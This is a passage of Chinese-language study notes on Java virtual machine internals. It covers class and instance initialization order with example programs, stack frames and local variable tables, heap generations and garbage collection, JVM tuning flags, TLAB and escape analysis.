等实例化对象时都不在进行初始化了，但是需要进行实例初始化，所以类初始化只运行一次。初始化的都是属于类（而不是实例）的内容（静态），所以对所有实例共享。\n\n这里简单说明下`<clinit>()`方法的执行规则:\n- `<clinit>()`方法是由编译器自动收集类中的<font color=\"red\">所有类变量的赋值动作和静态语句块(static{})中的语句合</font>并产生的，编译器收集的顺序是由语句在源文件中出现的顺序所决定的，静态语句块中只能访问到定义在静态语句块之前的变量，定义在它之后的变量，在前面的静态语句中可以赋值，但是不能访问。\n- `<clinit>()`方法与实例构造器`<init>()`方法（类的构造函数）不同，它不需要显式地调用父类构造器，虚拟机会保证在子类的`<clinit>()`方法执行之前，父类的`<clinit>()`方法已经执行完毕。因此，在虚拟机中第一个被执行的`<clinit>()`方法的类肯定是java.lang.Object。\n- `<clinit>()`方法对于类或接口来说并不是必须的，如果一个类中没有静态语句块，也没有对类变量的赋值操作，那么编译器可以不为这个类生成`<clinit>()`方法。\n- 接口中不能使用静态语句块，但仍然有类变量（final static）初始化的赋值操作，因此接口与类一样会生成`<clinit>()`方法。但是接口与类不同的是：执行接口的`<clinit>()`方法不需要先执行父接口的`<clinit>()`方法，只有当父接口中定义的变量被使用时，父接口才会被初始化。另外，接口的实现类在初始化时也一样不会执行接口的`<clinit>()`方法。\n- 虚拟机会保证一个类的`<clinit>()`方法在多线程环境中被正确地加锁和同步，如果多个线程同时去初始化一个类，那么只会有一个线程去执行这个类的`<clinit>()`方法，其他线程都需要阻塞等待，直到活动线程执行`<clinit>()`方法完毕。如果在一个类的`<clinit>()`方法中有耗时很长的操作，那就可能造成多个线程阻塞，在实际应用中这种阻塞往往是很隐蔽的。\n\n### 触发类初始化\n虚拟机规范严格规定了有且只有四种情况必须立即对类进行初始化：\n- 遇到new、getstatic、putstatic、invokestatic这四条字节码指令时，如果类还没有进行过初始化，则需要先触发其初始化。生成这四条指令最常见的Java代码场景是：使用new关键字实例化对象时、读取或设置一个类的静态字段（static）时（被static修饰又被final修饰的，已在编译期把结果放入常量池的静态字段除外）、以及调用一个类的静态方法时。\n- 使用Java.lang.refect包的方法对类进行反射调用时，如果类还没有进行过初始化，则需要先触发其初始化。\n- 当初始化一个类的时候，如果发现其父类还没有进行初始化，则需要先触发其父类的初始化。\n- 当虚拟机启动时，用户需要指定一个要执行的主类，虚拟机会先执行该主类。\n虚拟机规定只有这四种情况才会触发类的初始化，称为对一个类进行**主动引用**，除此之外所有引用类的方式都不会触发其初始化，称为被动引用。下面举一些例子来说明**被动引用**。\n1. 通过子类引用父类中的静态字段，这时对子类的引用为被动引用，因此不会初始化子类，只会初始化父类\n```java\nclass Father{\n\tpublic static int m = 33;\n\tstatic{\n\t\tSystem.out.println(\"父类被初始化\");\n\t}\n}\n \nclass Child extends Father{\n\tstatic{\n\t\tSystem.out.println(\"子类被初始化\");\n\t}\n}\n \npublic class StaticTest{\n\tpublic static void main(String[] args){\n\t\tSystem.out.println(Child.m);\n\t}\n}\n```\n执行后输出的结果如下：\n```\n父类被初始化\n33\n```\n对于静态字段，只有直接定义这个字段的类才会被初始化，因此，通过其子类来引用父类中定义的静态字段，只会触发父类的初始化而不会触发子类的初始化。\n\n2. static常量在编译阶段会存入调用它的类的常量池中，本质上没有直接引用到定义该常量的类，因此不会触发定义常量的类的初始化\n```java\nclass Test{\n\tpublic static final String NAME = \"我是常量\";\n\tstatic{\n\t\tSystem.out.println(\"初始化Const类\");\n\t}\n}\n \npublic class FinalTest{\n\tpublic static void main(String[] args){\n\t\tSystem.out.println(Test.NAME);\n\t}\n}\n```\n执行后输出的结果如下：\n```\n我是常量\n```\n虽然程序中引用了Test类的static常量NAME，但是在编译阶段将此static常量的值“我是常量”存储到了调用它的类FinalTest的常量池中（见[准备过程](#准备)），对常量Test.NAME的引用实际上转化为了FinalTest类对自身常量池的引用。也就是说，实际上FinalTest的Class文件之中并没有Test类的符号引用入口，这两个类在编译成Class文件后就不存在任何联系了。\n\n3. 通过数组定义来引用类，不会触发类的初始化\n```java\nclass Const{\n\tstatic{\n\t\tSystem.out.println(\"初始化Const类\");\n\t}\n}\n \npublic class ArrayTest{\n\tpublic static void main(String[] args){\n\t\tConst[] con = new Const[5];\n\t}\n}\n```\n执行后不输出任何信息，说明Const类并没有被初始化。\n但这段代码里触发了另一个名为“LLConst”的类的初始化，它是一个由虚拟机自动生成的、直接继承于java.lang.Object的子类，创建动作由字节码指令newarray触发，很明显，这是一个对数组引用类型的初初始化，而该数组中的元素仅仅包含一个对Const类的引用，并没有对其进行初始化。如果我们加入对con数组中各个Const类元素的实例化代码，便会触发Const类的初始化，如下：\n```java\nclass Const{\n\tstatic{\n\t\tSystem.out.println(\"初始化Const类\");\n\t}\n}\n \npublic class ArrayTest{\n\tpublic static void main(String[] args){\n\t\tConst[] con = new Const[5];\n\t\tfor(Const a:con)\n\t\t\ta = new Const();\n\t}\n}\n```\n这样便会得到如下输出结果：\n```\n初始化Const类\n```\n根据四条规则的第一条，这里的new触发了Const类。\n\n\n# 实例初始化\n实例初始化 `<init>`：也就是实例化对象时(即new一个对象)每次都会进行的过程，初始化属于实例的内容（非静态），没有实例所拥有的实例内容是不共享的，独有的。\n\n构造器：保证实例正确的初始化，能被使用。\n所以，既然子类继承了父类，那么子类调用构造函数初始化的，就需要调用父类的构造器，不管是显示调用父类构造器还是 JVM 自动调用，这样才能保证子类正确的被构造。\n那么，实例初始化的过程到底是如何的呢？\n- JVM 收集实例**非静态变量和 {} 域**组合成实例初始化方法`<init>()`；\n- 实例初始化时首先执行 `<init>()` 方法，然后执行构造函数；\n- 子类通过构造函数构造实例时会首先调用父类的 `<init>()` 方法和父类的构造函数，如果没有显示调用父类的构造函数，那么 JVM 会自动调用父类的无参构造函数，保证父类构造函数一定被调用，然后再是子类自己的 `<init>()` 方法和构造函数；\n至此，实例就构造完毕了；\n\n# java的类/实例初始化顺序\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132110.png)\n\n实例一：\n组合的初始化\n```java\nclass Window {\n    static {\n        System.out.println(\"Window static\");\n    }\n    Window (){\n        System.out.println(\"Window()\");\n    }\n    Window (int marker) {\n        System.out.println(\"Window(\" + marker + \")\");\n    }\n}\nclass House {\n    static {\n        System.out.println(\"House static\");\n    }\n    Window w1 = new Window(1);// Before constructor\n    House() {\n        System.out.println(\"House()\");\n        w3 = new Window(33);\n    }\n    Window w2 = new Window(2);\n    void f() {\n        System.out.println(\"f()\");\n    }\n    Window w3 = new Window(3);\n}\npublic class OrderOfInitialization {\n    static{\n      System.out.println(\"Te\");\n    }\n    public static void main(String[] args) {\n        House h = new House();\n        h.f();\n    }\n}\n```\n输出：\n```\nTe\nHouse static\nWindow static\nWindow(1)\nWindow(2)\nWindow(3)\nHouse()\nWindow(33)\nf()\n```\n\n示例二：\n继承的初始化\n```java\nclass Person {\n    private int i = 8;\n    protected int j;\n    static {\n        System.out.println(\"Person 静态初始化子句\");\n    }\n    {\n        System.out.println(\"Person 实例初始化子句\");\n    }\n    Person () {\n        System.out.println(\"Person()\");\n    }\n    Person(int i) {\n        System.out.println(\"Person(int), i=\" + i);\n    }\n    int k = printInit(\"Person.k 初始化\");\n    static int m = printInit(\"static Person.m 初始化\");\n    {\n        System.out.println(\"Person 后置实例初始化语句\");\n    }\n    static int printInit(String s) {\n        System.out.println(s);\n        return 47;\n    }\n}\n\npublic class Student extends Person {\n    Student () {\n        super(1);\n        System.out.println(\"Student()\");\n    }\n    Student(int i) {\n        this();\n        System.out.println(\"Student(int), i=\" + i);\n    }\n    public static void main(String[] args) {\n        new Person(3);\n        System.out.println(\"--------------------------\");\n        Student student = new Student(2);\n    }\n\n    public static int marker = printInit(\"Student.marker 初始化\");\n\n    {\n        System.out.println(\"Student 实例初始化域\");\n    }\n}\n```\n输出：\n```txt\nPerson 静态初始化子句\nstatic Person.m 初始化\nStudent.marker 初始化\nPerson 实例初始化子句\nPerson.k 初始化\nPerson 后置实例初始化语句\nPerson(int), i=3\n--------------------------\nPerson 实例初始化子句\nPerson.k 初始化\nPerson 后置实例初始化语句\nPerson(int), i=1\nStudent 实例初始化域\nStudent()\nStudent(int), i=2\n```\n(静态变量，静态初始化块) -> (变量，初始化块) -> (构造器)\n加载(静态变量，静态初始化块)的过程是类初始化过程\n加载(变量，初始化块)、构造器的过程是实例初始化过程\n\n>注：\n静态变量与静态初始化块的执行顺序与所写的顺序一致\n变量与初始化块的执行顺序与所写的顺序一致\n\n# Java内存区域\nJava虚拟机在执行Java程序的过程中会把他所管理的内存划分为若干个不同的数据区域。Java虚拟机规范将JVM所管理的内存分为以下几个运行时数据区：**程序计数器、Java虚拟机栈、本地方法栈、Java堆、方法区**。下面详细阐述各数据区所存储的数据类型。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132120.png)\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132133.png)\n\n## 程序计数器（Program Counter Register）\n一块较小的内存空间，它是当前线程所执行的字节码的行号指示器，字节码解释器工作时通过改变该计数器的值来选择下一条需要执行的字节码指令，分支、跳转、循环等基础功能都要依赖它来实现。**每条线程都有一个独立的的程序计数器，各线程间的计数器互不影响，因此该区域是线程私有的。**\n\n当线程在执行一个Java方法时，该计数器记录的是正在执行的虚拟机字节码指令的地址，当线程在执行的是Native方法（调用本地操作系统方法）时，该计数器的值为空。另外，**该内存区域是唯一一个在Java虚拟机规范中没有规定任何OOM（内存溢出：OutOfMemoryError）情况的区域**。\n\n## Java虚拟机栈（Java Virtual Machine Stacks）\nJava虚拟机栈(Java Virtual Machine Stack), 早期也叫Java栈。每个线程在创建时都会创建一个虚拟机栈，它的生命周期也与线程相同。\n\n虚拟机栈描述的是Java方法执行的内存模型：每个方法被执行的时候都会同时创建一个栈帧，栈它是用于支持续虚拟机进行方法调用和方法执行的数据结构。对于执行引擎来讲，活动线程中，只有栈顶的栈帧是有效的，称为当前栈帧，这个栈帧所关联的方法称为当前方法，执行引擎所运行的所有字节码指令都只针对当前栈帧进行操作。**栈帧用于存储局部变量表、操作数栈、动态链接、方法返回地址和一些额外的附加信息。在编译程序代码时，栈帧中需要多大的局部变量表、多深的操作数栈都已经完全确定了，并且写入了方法表的Code属性之中。因此，一个栈帧需要分配多少内存，不会受到程序运行期变量数据的影响，而仅仅取决于具体的虚拟机实现**。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132142.png)\n\n对于虚拟栈来说，是不存在垃圾回收问题的\n\n**在Java虚拟机规范中，对这个区域规定了两种异常情况：** \njava虚拟机规范允许java栈的大小是动态的或者是固定不变的\n- 如果采用固定大小的Java虚拟机栈，那每一个线程的Java虚拟机栈容量可以在线程创建的时候独立选定。如果线程请求分配的栈容量超过Java虚拟机栈允许的最大容量，Java虚拟机将会抛出一个StackOverflowError异常。\n- 如果Java虚拟机栈可以动态扩展，并且在尝试扩展的时候无法申请到足够的内存，或者在创建新的线程时没有足够的内存去创建对应的虚拟机栈，那Java虚拟机将会抛出一个OutOfMemoryError异常。\n\n**设置栈内存大小**\n我们可以使用参数-Xss选项来设置线程的最大栈空间\n用k或K表示KB，m或M表示MB，g或G表示GB。 如果什么都不加，则表示bytes\n例如: 下面都是表示设置成1024KB大小\n```\n-Xss1m\n-Xss1024k\n-Xss1048576\n```\n\n**实例：**\n```java\npublic class Math{\n\n  public static int count = 1;\n\n  public static void main(String[] args){\n    try{\n      count++; \n      main(args);\n    }catch(StackOverflowError e){\n      System.out.println(\"输出：\"+count);\n    }\n  }\n}\n```\n```shell\njavac Math.java && java -Xss1m Math\n输出：17946\n\njavac Math.java && java -Xss5m Math\n输出：123063\n```\n\n### 栈帧\n栈帧(Stack Frame)是用于支持虚拟机进行方法调用和方法执行的数据结构。栈帧存储了方法的局部变量表、操作数栈、动态连接和方法返回地址等信息。每一个方法从调用至执行完成的过程，都对应着一个栈帧在虚拟机栈里从入栈到出栈的过程。\n栈帧是用来存储数据和部分过程结果的数据结构，同时也用来处理动态连接、方法返回值和异常分派。\n栈帧随着方法调用而创建，随着方法结束而销毁——无论方法正常完成还是异常完成都算作方法结束。\n栈帧的存储空间由创建它的线程分配在Java虚拟机栈之中，每一个栈帧都有自己的本地变量表(局部变量表)、操作数栈和指向当前方法所属的类的运行时常量池的引用。\n接下来，详细讲解一下栈帧中的局部变量表、操作数栈、动态连接、方法返回地址等各个部分的数据结构和作用。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132152.png)\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132202.png)\n\n#### 局部变量表\n局部变量表是一组变量值存储空间，用于存放方法参数和方法内部定义的局部变量，其中存放的数据的类型是编译期可知的各种基本数据类型、对象引用（reference）和returnAddress类型（它指向了一条字节码指令的地址）。局部变量表所需的内存空间在编译期间完成分配，即在Java程序被编译成Class文件时，就确定了所需分配的最大局部变量表的容量。当进入一个方法时，这个方法需要在栈中分配多大的局部变量空间是完全确定的，在方法运行期间不会改变局部变量表的大小。\n\n局部变量表的容量以变量槽（Slot）为最小单位。在虚拟机规范中并没有明确指明一个Slot应占用的内存空间大小（允许其随着处理器、操作系统或虚拟机的不同而发生变化），一个Slot可以存放一个32位以内的数据类型：boolean、byte、char、short、int、float、reference和returnAddresss。reference是对象的引用类型，returnAddress是为字节指令服务的，它执行了一条字节码指令的地址。对于64位的数据类型（long和double），虚拟机会以高位在前的方式为其分配两个连续的Slot空间。\n\n虚拟机通过索引定位的方式使用局部变量表，索引值的范围是从0开始到局部变量表最大的Slot数量，对于32位数据类型的变量，索引n代表第n个Slot，对于64位的，索引n代表第n和第n+1两个Slot。\n\n在方法执行时，虚拟机是使用局部变量表来完成参数值到参数变量列表的传递过程的，如果是实例方法（非static），则局部变量表中的第0位索引的Slot默认是用于传递方法所属对象实例的引用，在方法中可以通过关键字“this”来访问这个隐含的参数。其余参数则按照参数表的顺序来排列，占用从1开始的局部变量Slot，参数表分配完毕后，再根据方法体内部定义的变量顺序和作用域分配其余的Slot。\n\n```java\npublic class Math{\n  public static int count = 1;\n\n  public static void main(String[] args){\n    Math m = new Math();\n    int a = 10;\n    System.out.println(m.meth());\n  }\n  \n  public static int meth(){\n    int a = 1;\n    int b = 2;\n    return a+b;\n  }\n}\n```\n对应上述代码使用`javac -g Math.java`来编译，加-g参数的目的是让生成的字节码文件带有局部变量表信息。然后使用`javap -v Math.class`来查看字节码文件详细信息，如下\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132217.png)\n\n**注：**\n如果当前栈帧是由构造方法或者非静态方法创建的，那么该对象引用this将会放在index为0的slot处，其余的参数按照参数表顺序继续排列,如下是一个非静态方法的局部变量表信息：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132243.png)\n**这也就是为什么静态方法中不能使用this的原因所在**；即this变量不存在与静态方法的局部变量表中，即没办法使用this\n\n<font color=\"red\">有关局部变量、实例成员变量、类成员变量的存放位置</font>\n实例成员变量的生命周期是跟随对象的。而对象实例化之后，存放在堆中，所以实例成员变量也会存在堆中。\n类成员变量的生命周期是跟随类的，而类加载后，存放在方法区中，所以\n静态变量(也叫类变量)是存放在方法区中的。\n局部变量是属于方法的，也就存在栈中。\n**注：局部变量表是不会存放成员变量的**\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132258.png)\n\n**槽位重用**\n栈帧中的局部变量表中的槽位是可以重复用的，如果一个局部变量过了其作用域，那么在其作用域之后申明的新的局部变量就很有可能会复用过期局部变量的槽位，从而达到节省资源的目的，如下所示\n```java\npublic void meth1(){\n  int a = 0;\n  {\n    int b = 0;\n    b = a + 1;\n  }\n  int c = a + 1;\n}\n```\n对应的局部变量表：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132311.png)\n\n#### 操作数栈\n操作数栈(Operand Stack)也常被称为操作栈，它是一个后入先出(Last In First Out，LIFO) 栈 。 同局部变量表一样 ， 操作数栈的最大深度也在编译的时候被写入到Code属性的max_stacks数据项之中。操作数栈的每一个元素都可以是包括long和double在内的任意Java数据类型。32位数据类型所占的栈容量为1，64位数据类型所占的栈容量为2。Javac编译器的数据流分析工作保证了在方法执行的任何时候 ，操作数栈的深度都不会超过在max_stacks数据项中设定的最大值 。\n\n当一个方法刚刚开始执行的时候，这个方法的操作数栈是空的，在方法的执行过程中，会有各种字节码指令往操作数栈中写入和提取内容，也就是出栈和入栈操作。譬如在做算术运算的时候是通过 将运算涉及的操作数栈压入栈顶后调用运算指令来进行的，又譬如在调用其他方法的时候是通过操作 数栈来进行方法参数的传递。举个例子，例如整数加法的字节码指令iadd，这条指令在运行的时候要 求操作数栈中最接近栈顶的两个元素已经存入了两个int型的数值，当执行这个指令时，会把这两个int 值出栈并相加，然后将相加的结果重新入栈。\n\n操作数栈中元素的数据类型必须与字节码指令的序列严格匹配，在编译程序代码的时候，编译器必须要严格保证这一点，在类校验阶段的数据流分析中还要再次验证这一点。再以上面的iadd指令为例，这个指令只能用于整型数的加法，它在执行时，最接近栈顶的两个元素的数据类型必须为int型， 不能出现一个long和一个float使用iadd命令相加的情况。\n\n#### 动态连接\n每个栈帧都包含一个指向运行时常量池（在方法区中，后面介绍）中该栈帧所属方法的引用，持有这个引用是为了支持方法调用过程中的动态连接。Class文件的常量池中存在有大量的符号引用，字节码中的方法调用指令就以常量池中指向方法的符号引用为参数。这些符号引用，一部分会在类加载阶段或第一次使用的时候转化为直接引用（如final、static域等），称为静态解析，另一部分将在每一次的运行期间转化为直接引用，这部分称为动态连接。\n\n**实例**\n```java\npublic class Math{\n\n  public static void main(String[] args){\n    int a = 10;\n    meth();\n  }\n  \n  public static int meth(){\n    int a = 1;\n    return a;\n  }\n}\n```\n对应的字节码文件如下：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132322.png)\n\n#### 方法返回地址\n当一个方法被执行后，有两种方式退出该方法：执行引擎遇到了任意一个方法返回的字节码指令或遇到了异常，并且该异常没有在方法体内得到处理。无论采用何种退出方式，在方法退出之后，都需要返回到方法被调用的位置，程序才能继续执行。方法返回时可能需要在栈帧中保存一些信息，用来帮助恢复它的上层方法的执行状态。一般来说，方法正常退出时，调用者的PC计数器的值就可以作为返回地址，栈帧中很可能保存了这个计数器值，而方法异常退出时，返回地址是要通过异常处理器来确定的，栈帧中一般不会保存这部分信息。\n\n方法退出的过程实际上等同于把当前栈帧出站，因此退出时可能执行的操作有：恢复上层方法的局部变量表和操作数栈，**如果有返回值，则把它压入调用者栈帧的操作数栈中**，调整PC计数器的值以指向方法调用指令后面的一条指令。\n\n## 堆\nJava 中的堆是 JVM 管理的最大的一块内存空间，主要用于存放Java类的实例对象，其被划分为二个不同的区域：年轻代 ( Young )、老年代 ( Old )，其中年轻代 ( Young )又被划分为：Eden、From Survivor和To Survivor三个区域，如下图所示：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132333.png)\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132342.png)\n\n- 堆大小 = 年轻代( Young ) + 老年代( Old )。\n- 年轻代 ( Young ) 被细分为 Eden 和 两个 Survivor 区域，为了便于区分，两个 Survivor 区域分别被命名为 from 和 to。默认情况下，Eden : from : to = 8 : 1 : 1 ( 可以通过参数 –XX:SurvivorRatio 来设定 )，即： Eden = 8/10 的年轻代空间大小，from = to = 1/10 的年轻代空间大小。JVM 每次只使用 Eden 和其中的一块 Survivor 区域来为对象服务，所以无论什么时候，总是有一块 Survivor 区域是空闲着的，因此，年轻代实际可用的内存空间为 9/10 ( 即90% )的年轻代空间。\n- 工作原理：\n  - Eden区为Java对象分配堆内存，当 Eden 区没有足够空间分配时，JVM发起一次Minor GC，将Eden区仍然存活的对象放入Survivor from区，并清空 Eden 区；\n  - Eden区被清空后，继续为新的Java对象分配堆内存；\n  - 当Eden区再次没有足够空间分配时，JVM对Eden区和Survivor from区同时发起一次 Minor GC，把存活对象放入Survivor to区，同时清空Eden 区和Survivor from区；\n  - Eden区继续为新的Java对象分配堆内存，并重复上述过程：Eden区没有足够空间分配时，把Eden区和某个Survivor区的存活对象放到另一个Survivor区；\n  - JVM给每个对象设置了一个对象年龄（Age）计数器，每熬过一场Minor GC，对象年龄增加1岁，当它的年龄增加到阈值（默认为15，可以通过-XX：MaxTenuringThreshold 参数自定义该阀值），将被“晋升”到老年代，当 Old 区也被填满时，JVM发起一次 Major GC，对 Old 区进行垃圾回收。如果进行Major Gc后，Old区还是满的，则会导致内存溢出错误\n\n**Minor GC, Major GC, Full GC**\n针对HotSpot VM的实现，它里面的GC按照回收区域有分为两大类型：一种是部分收集(Partial GC), 一种是整体收集(Full GC)\n- 部分收集：不是完整收集整个Java堆的垃圾收集。其中有分为\n  - 新生代收集(Minor GC / Young GC): 只是新生代的垃圾收集\n  - 老年代收集(Major GC / Old GC): 只是老年代的垃圾收集。 目前只有CMS GC会有单独收集老年代的行为。注意，很多时候Major GC会和Full GC混合使用，需要具体分辨是老年代回收还是整堆回收\n  - 混合收集(Mixed GC): 收集整个新生代以及部分老年代的垃圾回收。目前只有G1 GC会有这种行为\n- 整堆收集(Full GC): 收集整个java堆和方法区垃圾收集\n\n**所有的GC操作都会触发全世界的暂停STW（stop-the-world)，停止应用程序的所有用户线程，不过这个过程非常短暂。<font color='red'>所以jvm调优的主要目的就是减少GC的次数，特别时Full GC</font>**\n\n**为什么需要stop the world？不stop thw world 可以吗？**\n答：在进行标记的时候，如果工作线程不停止的话，那么肯定会有新对象生成。这些对象是没有被标记的，里面可能有存活的对象，也可能有已经没有被引用的垃圾对象。那么在标记完后，进行回收时。要如何回收？\n因为Serial 和 ParNew 是采用的复制算法。回收的时候，是需要把存活对象移到Survivor中的。而那些没有被标记的，有存活的，也有垃圾对象。显然不能全部移动到survivor 中的。\n另外如果工作线程没有停止工作，那么工作线程和回收线程是一起执行的。工作线程可能会打乱对象之间的引用关系，这个对回收线程进行标记是有影响的。\n所以，在进行新生代回收的时候，是需要stop the world 的。\n\n### 堆大小的设置\n堆的大小在jvm启动时就已经设定好了，可以通过`-Xms`和`-Xmx`来进行设置\n- `-Xms`:表示堆区的初始内存，等价于-XX:InitialHeapSize。默认为物理内存的1/16, `-X`是jvm的运行参数，`ms`是memory sart \n- `-Xmx`:表示堆区的最大内存，等价于-XX:MaxHeapSize。默认为物理内存的1/4\n\n- 一旦堆区中的内存大小超过`-Xmx`所指定的最大内存时，将会抛出OutOfMemoryError异常\n通常会将`-Xms`和`-Xmx`两个参数配置相同的值，其目的是为了能够在java垃圾回收机制清理完堆区后不需要重新分隔计算堆区的大小，从而提高性能\n\n- `-XX:-UseAdaptiveSizePolicy`是关闭自适应的内存分配策略，默认是开启的。如果开启的话，会使得分配给Survivor from区与Survivor to区的内存大小不相等\n\n**为什么需要把java堆分代？不分代就不能正常工作了吗？**\n答：其实不分代完全可以，分代的唯一理由就是**优化GC性能**。如果没有分代，那所有的对象都在一块，就如同把一个学校的人都关在一个教室。GC的时候要找到那些对象没用，这样就会对堆的所有区域进行扫描。而很多对象都是朝生夕死的，如果分代的话，把新创建的对象放到某一地方，当GC的时候先把这块存储朝生夕死对象的区域进行回收，这样就会腾出很大的空间出来\n\n**查看堆大小的三种方法**\n- 可以使用`java -XX:+PrintGCDetails 类名.class`来运行java程序，可以展示堆的分配以及GC的详细情况，如下：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132354.png)\n\n- 通过代码获取堆信息\n```java\npublic static void main(String[] args){\n  long initialMemory = Runtime.getRuntime().totalMemory() / 1024 / 1024;\n  long maxMemory = Runtime.getRuntime().maxMemory() / 1024 / 1024;\n  System.out.println(\"-Xms:\" + initialMemory + \"M\");\n  System.out.println(\"-Xmx:\" + maxMemory + \"M\");\n}\n```\n\n- 使用`jstat -gc java进程id`命令\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132410.png)\n\n**年轻代与老年代在堆结构的占比**\n- 可以修改`-XX:NewRatio`的值来修改其占比\n- 默认`-XX:NewRatio=2`, 表示新生代占1，老年代占2，新生代占整个堆的1/3\n注：可以通过`jinfo -flag NewRatio 进程id`来查看NewRatio的值，如下：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132432.png)\n\n### 年轻代与老年代\n- 在HotSpot中，Eden空间和另外两个Survivor空间缺省默认所占比例是8:1:1\n- 当然可以通过`-XX:SurvivorRatio`调整这个空间比例。比如`-XX:SurvivorRatio=6`\n- 几乎所有的java对象都是在Eden区被new出来的， **大对象可能直接分配到老年代中**，所以我们尽量避免程序中出现过多的大对象\n- 绝大部分java对象的销毁在新生代进行\n- 可以使用`-Xmn`设置新生代最大内存大小，这个参数一般使用默认值就可以\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132445.png)\n\n### 对象分配过程：TLAB\n**为什么有TLAB(Thread Local Allocation Buffer)?**\n- 堆区是线程共享区域，任何线程都可以访问到堆区中的共享数据\n- 由于对象实例的创建在JVM中非常频繁，因此在并发环境下从堆区中划分内存空间是线程不安全的\n- 为避免多个线程操作同一地址，需要使用加锁等机制，进而影响分配速度\n\n**什么是TLAB?**\n- 从内存模型而不是垃圾收集的角度，对Eden区域继续进而划分，JVM为每个线程分配了一个私有缓存区域，它包含在Eden空间内\n- 多线程同时分配内存时，使用TLAB可以避免一系列的非线程安全问题，同时还能够提示内存分配的吞吐量，因此我们可以将这种内存分配方式称之为快速分配策略\n- 据我所知所有OpenJDK衍生出来的JVM都提供了TLAB的设计\n- 尽管不是所有的对象实例都能够在TLAB中成功分配内存，但JVM确实是将TLAB作为内存分配的首选\n- 可以通过`-XX:UseTLAB`设置是否开启TLAB空间，默认是开启的\n- 默认情况下，TLAB空间的内存非常小，仅占有整个Eden空间的1%, 当然我们可以通过选项`-XX:TLABWasteTargetPercent`设置TLAB空间所占有Eden空间的百分比\n- 一旦对象在TLAB空间分配内存失败时，JVM就会尝试着通过使用加锁机制确保数据操作的原子性，从而直接在Eden空间中分配内存\n\n### 堆空间的常见参数设置\n[官网说明](https://docs.oracle.com/javase/8/docs/technotes/tools/unix/java.html)\n- -XX:+PrintFlagsInitial: 查看所有的参数的默认初始值\n- -XX:+PrintFlagsFinal: 查看所有的参数的最终值(可能会存在修改，不再是初始值)\n- -Xms: 初始堆空间内存(默认为物理内存的1/64)\n- -Xmx: 最大堆空间内存(默认为物理内存的1/4)\n- -Xmn: 设置新生代的大小 (初始值即最大值)\n- -XX:NewRatio: 配置新生代与老年代在堆结构的占比\n- -XX:SurvivorRatio: 设置新生代中Eden和S0/S1空间的比例\n- -XX:MaxTenuringThreshold: 设置新生代垃圾的最大年龄\n- -XX:+PrintGCDetails: 输出详细的GC处理日志\n- -XX:HandlePromotionFailure: 是否设置空间分配担保\n\n### 逃逸分析\n首先堆不是分配对象存储的唯一选择\n随着JIT编译期的发展与**逃逸分析技术**逐渐成熟，**栈上分配、标量替换优化技术**将会导致一些微妙的变化，所有的对象都分配到堆上也渐渐变得不那么“绝对”了\n在java虚拟机中，对象是在java堆中分配内存的，但是，有一种特殊情况，那就是<font color='red'>如果经过逃逸分析(Escape Analysis)后发现，一个对象并没有逃逸出方法的话，那么就可能被优化成栈上分配。</font>这样就无需在堆上分配内存，由于是分配到虚拟栈上的，所以对象会随着方法执行的结束而移除，因此也无须进行垃圾回收了，这也是最常见的堆外存储技术。**并且将对象分配到虚拟栈上后，这个对象是线程安全的，即对于这个对象的操作可以不考虑同步**\n\n**逃逸分析概叙**\n- 使用逃逸分析手段来判断是否可以将一个新的对象分配到栈上\n- 逃逸分析是一种可以有效减少java程序中同步负载和内存堆分配压力的跨函数全局数据流分析算法\n- 逃逸分析的基本行为就是分析对象动态作用域：\n  - 当一个对象在方法中被定义后，对象只在方法内部使用，即方法外部没有指向该对象的变量，则认为没有发送逃逸\n  - 当一个对象在方法中被定义后，它被外部方法所引用，则认为发生逃逸。例如作为调用参数传递到其他地方中\n- 在jdk6后，HotSpot中默认就开启了逃逸分析， 可以通过`-XX:-DoEscapeAnalysis`关闭逃逸分析\n- 可以通过`-XX: +PrintEscapeAnalysis` 查看逃逸分析的筛选结果\n\n```java\n//为成员变量赋值，因此发生了逃逸\npublic void test1(){\n  this.obj = new Person();\n}\n\n//p对象的作用域仅在当前方法中有效，因此没有发生逃逸\npublic void test2(){\n  Person p = new Person();\n}\n```\n\n**结论**\n开发中能使用局部变量的，就不要在方法外部定义\n\n### 通过逃逸分析实现代码优化\n**逃逸分析之标量替换**\n- `标量(Scalar)`是指一个无法再分解成更小的数据的数据。Java中的原始数据类型就是标量，标量是存储再虚拟栈中\n- 相对的，那些还可以分解的数据叫做`聚合量(Aggregate)`, Java中的对象就是聚合量，因为他可以分解成其他聚合量和标量\n- 在JIT阶段，如果经过逃逸分析，发现一个对象不会被外界访问的话，那么经过JIT优化，就会把这个对象拆解成若干个其中包含的若干个成员变量来代替。这个过程就是`标量替换`\n- 标量替换默认是开启的，允许将对象打散分配到栈上。也可以通过`-XX:-EliminateAllocations`来关闭标量替换\n\n```java\npublic static void main(String[] args){\n  alloc();\n} \nprivate static void alloc(){\n  Point point = new Point();\n  System.out.println(\"point.x=\"+point.x+\"; point.y=\"+point.y);\n}\nclass Point{\n  private int x;\n  private int y;\n}\n```\n以上代码，经过逃逸分析，发现point对象没有逃逸，所以经过标量替换，就被替换成两个标量，如下代码所示，由于标量是存储在栈中，从而大大减少堆内存的占用。\n```java\nprivate static void alloc(){\n  int x = 1;\n  int y = 2;\n  System.out.println(\"point.x=\"+x+\"; point.y=\"+y);\n}\n```\n\n**例子**\n```java\npublic class Math{\n\n  public static void main(String[] args){\n    long start = System.currentTimeMillis();\n\n    for(int i = 0; i < 100000000; i++){\n      alloc();\n    }\n    //查看执行时间\n    long end = System.currentTimeMillis();\n    System.out.println(\"花费的时间：\"+(end - start) + \"ms\");\n    try{\n      Thread.sleep(100000);\n    }catch(InterruptedException e){\n      